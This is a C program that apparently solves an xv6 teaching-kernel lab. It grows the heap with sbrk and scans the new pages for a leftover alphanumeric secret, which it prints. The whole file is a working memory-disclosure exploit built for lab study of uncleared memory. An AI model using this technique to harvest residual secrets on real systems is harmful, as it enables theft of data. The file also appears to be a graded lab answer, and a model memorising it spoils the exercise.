// user/attack.c
// Try to find a secret left in freshly-allocated pages.
// The secret is guaranteed to be alphanumeric (A-Z a-z 0-9).
//
// Strategy:
//  - grow the heap (sbrk) to get freshly-allocated pages which may
//    still contain old data (the secret).
//  - scan every byte of those pages looking for a NUL-terminated
//    sequence of alphanumeric characters. If found, print it and exit.
//
// Note: grader runs attack twice; if it fails first time it may succeed later
// because allocator hands out different pages on subsequent runs.

#include "kernel/types.h"
#include "kernel/stat.h"
#include "user/user.h"

#define PGSIZE 4096
#define MAX_CAND 512   // max candidate length we will consider
#define CHUNK_PAGES 32 // pages to allocate in one sbrk call (tuneable)

static int
isalnum_char(char c) {
  if (c >= '0' && c <= '9') return 1;
  if (c >= 'A' && c <= 'Z') return 1;
  if (c >= 'a' && c <= 'z') return 1;
  return 0;
}

int
main(int argc, char *argv[]) {
  // We will try several allocations to increase chance of hitting
  // pages that used to hold the secret.
  int tries = 8;
  int pages = CHUNK_PAGES;
  int i;

  for (i = 0; i < tries; i++) {
    // allocate pages (sbrk returns old break)
    char *start = (char*) sbrk(pages * PGSIZE);
    if (start == (char*)-1) {
      // sbrk failed
      fprintf(2, "attack: sbrk failed\n");
      exit(1);
    }
    char *end = start + pages * PGSIZE;

    // scan every address in allocated region
    char *p;
    for (p = start; p < end; p++) {
      // quick check: must start with alnum
      if (!isalnum_char(*p)) continue;

      // gather candidate characters up to MAX_CAND or page end
      char buf[MAX_CAND + 1];
      int j = 0;
      char *q = p;
      // collect alnum until NUL or non-alnum or limit
      while (q < end && j < MAX_CAND) {
        char c = *q;
        if (c == '\0') {
          // candidate found: length j (possibly 0 if immediate NUL)
          if (j > 0) {
            buf[j] = '\0';
            // print the candidate and exit
            printf("%s\n", buf);
            exit(0);
          } else {
            break;
          }
        }
        if (!isalnum_char(c)) break;
        buf[j++] = c;
        q++;
      }
      // if we reached NUL and j>0 we already exited
      // otherwise continue scanning
    }

    // If not found, try to allocate more on next iteration.
    // Note: we don't deallocate the memory (we leave it in the heap)
    // so subsequent sbrk calls return different new pages.
  }

  // Not found
  // The grader will run attack twice; printing nothing here is acceptable too.
  // But print a diagnostic on stderr so you can debug:
  fprintf(2, "attack: secret not found\n");
  exit(1);
}
